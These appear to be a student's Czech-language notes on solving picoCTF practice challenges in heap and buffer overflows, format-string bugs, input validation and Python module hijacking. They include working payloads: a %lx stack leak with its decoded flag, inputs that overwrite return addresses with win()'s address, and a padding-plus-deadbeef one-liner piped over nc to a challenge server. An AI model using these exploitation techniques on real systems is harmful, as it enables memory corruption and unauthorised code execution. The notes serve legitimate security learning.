## Heap 0
po spuštění
![[Pasted image 20241031165519.png]]
source code (co nás zajíma)
![[Pasted image 20241031165549.png]]
pravděpodobně se bude jednat o overflow (hráním si se sizem)
![[Pasted image 20241031165630.png]]
strcmp => rovnocenné = 0
jiný = 1
safe var je to na adrese 0x6...d0, kde je zapsáno "bico"
![[Pasted image 20241031165811.png]]
tady máme co se nám na allocovalo (máme z dřívějška 5)
![[Pasted image 20241031165901.png]]
a budeme asi muset pře bufferovat input_data
(také můžeme porovnat hodnoty adres ...b0 a ....d0 (208-176) což je 32, takže stačí napsat 33+ znaků)
vyzkoušíme
![[Pasted image 20241031170010.png]]
a máme flagu.

## Format string 0
![[Pasted image 20241031171303.png]]
tento krát v kódu je strcmp s \==, takže vyzkoušíme jak se to bude chovat bez bufferu :/

![[Pasted image 20241031171433.png]]
pravděpodobně %s nám rovnou udělalo overflow za nás?

první `Gr%114d_Cheese` vsune do kódu `%114d` (int 114 bitů? dlouhý)

druhý `Cla%sic_Che%s%steak` vsune %s, což zapříčiní chybu a vyvolá se ![[Pasted image 20241122092806.png]] 

pochopení format stringu
`printf ()`
` %[flags][width][.precision][size]type`
### specifiers (types)

	**c	Character	When used with printf functions, specifies a single-byte character; when used with wprintf functions, specifies a wide character.
	**C	Character	When used with printf functions, specifies a wide character; when used with wprintf functions, specifies a single-byte character.
	**d	Integer	Signed decimal integer.
	**i	Integer	Signed decimal integer.
	**o	Integer	Unsigned octal integer.
	**u	Integer	Unsigned decimal integer.
	**x	Integer	Unsigned hexadecimal integer; uses "abcdef".
	**X	Integer	Unsigned hexadecimal integer; uses "ABCDEF".
	**e	Floating-point	Signed value that has the form [-]d.dddde[+|-]dd[d], where d is one decimal digit, dddd is one or more decimal digits depending on the specified precision, or six by default, and dd[d] is two or three decimal digits depending on the output format and size of the exponent.
	**E	Floating-point	Identical to the e format except that E rather than e introduces the exponent.
	**f	Floating-point	Signed value that has the form [-]dddd.dddd, where dddd is one or more decimal digits. The number of digits before the decimal point depends on the magnitude of the number, and the number of digits after the decimal point depends on the requested precision, or six by default.
	**F	Floating-point	Identical to the f format except that infinity and NaN output is capitalized.
	**g	Floating-point	Signed values are displayed in f or e format, whichever is more compact for the given value and precision. The e format is used only when the exponent of the value is less than -4 or greater than or equal to the precision argument. Trailing zeros are truncated, and the decimal point appears only if one or more digits follow it.
	**G	Floating-point	Identical to the g format, except that E, rather than e, introduces the exponent (where appropriate).
	**a	Floating-point	Signed hexadecimal double-precision floating-point value that has the form [-]0xh.hhhhp[+|-]dd, where h.hhhh are the hex digits (using lower case letters) of the mantissa, and dd are one or more digits for the exponent. The precision specifies the number of digits after the point.
	**A	Floating-point	Signed hexadecimal double-precision floating-point value that has the form [-]0Xh.hhhhP[+|-]dd, where h.hhhh are the hex digits (using capital letters) of the mantissa, and dd are one or more digits for the exponent. The precision specifies the number of digits after the point.
	**n	Pointer to integer	Number of characters that are successfully written so far to the stream or buffer. This value is stored in the integer whose address is given as the argument. The size of the integer pointed at can be controlled by an argument size specification prefix. The n specifier is disabled by default; for information see the important security note.
	**p	Pointer type	Display the argument as an address in hexadecimal digits.
	**s	String	When used with printf functions, specifies a single-byte or multi-byte character string; when used with wprintf functions, specifies a wide-character string. Characters are displayed up to the first null character or until the precision value is reached.
	**S	String	When used with printf functions, specifies a wide-character string; when used with wprintf functions, specifies a single-byte or multi-byte character string. Characters are displayed up to the first null character or until the precision value is reached.

![[Pasted image 20241122091247.png]]
## Heap 1
z heap 0 změněno jen toto
![[Pasted image 20241031182143.png]]
musíme tedy přebufferovat na pico

z minula se dá vypočítat že bufferovat se začalo po 32 znacích
takže postup je jednoduchý
![[Pasted image 20241031182315.png]]

## Heap 2
hlavní věc - pointer
![[Pasted image 20241031184910.png]]
![[Pasted image 20241108201144.png]]
![[Pasted image 20241108201206.png]]

\+ hint  ![[Pasted image 20241108200527.png]]
musíme nějak odkázat na funkci win()

pravděpodobně přes adresu funkce win

## Format String 1
![[Pasted image 20241122092911.png]]

https://lettieri.iet.unipi.it/hacking/format-strings.pdf

The simplest way to exploit a format string vulnerability is to leak information from the stack of the process under attack. **On 32b systems, a sequence of %x specifiers will cause printf() to print successive lines from the stack. On 64b systems, the first 5 %lx will print the contents of the (==registers==) rsi, rdx, rcx, r8, and r9, and any additional %lx will start printing successive stack lines. By studying the binary, or simply by observing the output, the attacker may be able to determine which of these lines contains the stack canary. On 32b systems the canary can be read with %x, but on 64b you need %lx, because %x will only read 4 bytes in both systems.** The only real difficulty for the attacker comes from space limitations in the controlled buffer, since the argument pointer is only moved forward by a format specifier. Any format specifier will move the argument pointer by at least one stack line (which is 4 bytes in 32b systems and 8 bytes in 64b systems), since arguments are always aligned to stack lines. Assume that the buffer size is s: the attacker can only move the argument pointer by ⌊s/2⌋ lines, which may not be enough to reach the canary’s position.

![[Pasted image 20241122100024.png]]
402118,0,7daeeaee6a00,0,1c22880,a347834,7ffdf3f817f0,7daeeacd7e60,7daeeaefc4d0,1,7ffdf3f818c0,0,0,7b4654436f636970,355f31346d316e34,3478345f33317937,35625f673431665f,7d663839623764,7,7daeeaefe8d8,2300000007,206e693374307250,a336c797453,9,7daeeaf0fde9,7daeeace0098,7daeeaefc4d0,0,7ffdf3f818d0,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25,2c786c252c786c25

from hex
![[Pasted image 20241122100324.png]]

ale obráceně protože little endian

rozkouzkujeme podle 8 kousků
{FTCocip
5_14m1n4
4x4_31y7
5b_g41f_
}f89b7d

a obrátíme

picoCTF{
4n1m41_5
7y13_4x4
\_f14g_b5
d7b98f}


`picoCTF{4n1m41_57y13_4x4_f14g_b5d7b98f}`

## Format String 2
![[Pasted image 20241122101052.png]]

## Buffer overflow 0
![[Pasted image 20241129084824.png]]
Zeptá se nás na imput: 
znova musíme schodit program -> sigsegv_handler (SIGSEGV přerušní paměti (sr. no. 5))
![[Pasted image 20241129091232.png]]
zadaný znak se copyne -> buf2 je setlý na 16 znaků 
musíme tedy napsat více jak 16 znaků
![[Pasted image 20241129091607.png]]
_**Význam registrů v CPU:**_

_These registers are 32 bits each, like a long int in c++, or like a LONG in basic:_

- _eax - accumulator. Very general purpose. Used for math, data, and function return values._
- _ebx - base address (within ds)._
- _ecx - counter. Used for loops and repeats._
- _edx - data. Very general purpose. Used for math and data._
- _esi - source index (within ds). Used for sequential memory access._
- _edi - destination index (within es). Used for sequential memory access._
- _ebp - base pointer (within ss). Used for stack frames within functions._
- _esp - stack pointer (within ss). Always points to the current bottom of the stack._
- _eip - instruction pointer. Always points to the next instruction to execute after the current one._
- _eflags - status and condition flags. Indicates whether the last math operation generated a carry/overflow, resulted in a zero, etc._
## Buffer overflow 1
![[Pasted image 20241129093151.png]]

pokud zadáme číslo větší než ... tak se nám vypíše jeho adressa ve vzorci hex toho stringu/intu
![[Pasted image 20241129093518.png]]


asi musíme setnout adressu na adressu fce win()
![[Pasted image 20241129094917.png]]
0x080491f6

musíme najít jak velká padding/offset má být
https://zerosum0x0.blogspot.com/2016/

ze zásobníku to začne týct ze Bufferu do ebp a pak do eip (return adresa (ukazatel na další instrukci))

potřebujeme zjistit adresu eip registeru (kdy začíná, protože to je return adresa)
==něco v gdb co nám vypíše registery==
to nám dá že začína na 4Ab5
![[Pasted image 20241129100253.png]]
44 znaků a přidáme 0x080491f6 ale v little endianu

55555555555555555555555555555555\xf6\x91\x04\x08

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

do gdb s petou
run < <(echo -ne "555555555555555555555555555555ab444444444444\xf6\x91\x04\x08")
![[Pasted image 20241129100821.png]]

(echo -ne 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08\n'; cat -)

![[Pasted image 20241129101423.png]]
picoCTF{addr3ss3s_ar3_3asy_b15b081e}

## bacis-file-exploit
![[Pasted image 20241206090241.png]]
![[Pasted image 20241206090202.png]]
![[Pasted image 20241206090210.png]]
![[Pasted image 20241206090219.png]]
![[Pasted image 20241206090232.png]]




![[Pasted image 20241206092230.png]]
strtol (string to long) když input není validní, tak vypíše nulu
==úloha na neošetření vstupu==

první parametr je string a druhý je ukazatel a třetí je v jaké soustavě to konvertovat
a máme podmínku kde se musí rovnat nule.

takže ve Please enter the entry number musíme dát 0 (když normálně by měl zadat string, tak tady program má chybu a nechá nás zapsat něco jiného)

![[Pasted image 20241206092201.png]]

## clutter-overflow
![[Pasted image 20241206093034.png]]
![[Pasted image 20241206094637.png]]
![[Pasted image 20241206094844.png]]
buffer overflow
![[Pasted image 20241206095056.png]]
![[Pasted image 20241206095432.png]]

první nula se mv zde![[Pasted image 20241206095212.png]]
takže chceme najít kde začíná registr rbp

přes SIZE což je 0x100 = 256

v gdb k tomu složí i command pattern _number_

![[Pasted image 20241206095651.png]]

![[Pasted image 20241206095636.png]]

![[Pasted image 20241206100054.png]]

![[Pasted image 20241206100102.png]]

![[Pasted image 20241206095212.png]]
z minula jsem ještě odebírali -0x8, takže ještě musíme taky ze 272 odebrat 8 = 264

takže 264 padding a pak zase v little endian deadbeef >==\xef\xbe\xad\xde==

(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890
![[Pasted image 20241206101151.png]]

## RockPaperScissors (RPS)
![[Pasted image 20241213091003.png]]
![[Pasted image 20241213091013.png]]
![[Pasted image 20241213091614.png]]
![[Pasted image 20241213091039.png]]
![[Pasted image 20241213091243.png]]
kód vybere rand z loses a to dá jako substring -> takže když computer dá paper tak já musím dát rock, atd..
můžeme obelhat tím že napíšeme všechny možnosti
opakujeme 5krát a máme win

![[Pasted image 20241213091426.png]]

## hijacking
![[Pasted image 20241213093131.png]]
![[Pasted image 20241213093205.png]]
![[Pasted image 20241213093348.png]]
![[Pasted image 20241213093731.png]]
![[Pasted image 20241213094003.png]]
s vi jde otevřít, ale nemáme oprávnění
![[Pasted image 20241213094322.png]]
![[Pasted image 20241213094458.png]]


pomocí python3, import a print(x.\_\_file\_\_)
![[Pasted image 20241213095515.png]]
jako jediný rwx máme base64.py
![[Pasted image 20241213100342.png]]
můžeme tedy upravit


![[Pasted image 20241213101633.png]]

import.os

os.system("")
os.system("")